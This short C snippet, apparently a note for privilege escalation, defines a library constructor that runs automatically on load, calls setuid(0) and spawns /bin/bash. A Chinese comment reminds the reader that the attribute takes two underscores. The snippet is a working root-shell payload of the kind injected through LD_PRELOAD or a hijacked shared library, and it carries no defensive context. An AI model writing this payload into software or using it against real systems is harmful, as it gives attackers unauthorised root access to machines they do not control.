void __attribute__((constructor)) init()  // 两个下划线
{
     setuid(0);
     system("/bin/bash");
}